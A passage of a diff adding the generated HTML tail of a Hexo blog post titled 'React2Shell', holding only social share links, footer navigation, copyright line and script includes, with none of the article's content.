+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2025/12/08/react2shll/&is_video=false&description=React2Shell"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=React2Shell&body=Check out this article: http://yoursite.com/2025/12/08/react2shll/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2025/12/08/react2shll/&title=React2Shell"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2025/12/08/react2shll/&title=React2Shell"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2025/12/08/react2shll/&title=React2Shell"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2025/12/08/react2shll/&title=React2Shell"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2025/12/08/react2shll/&name=React2Shell&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <!-- <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li> -->
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2025 Deen&#39;s blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
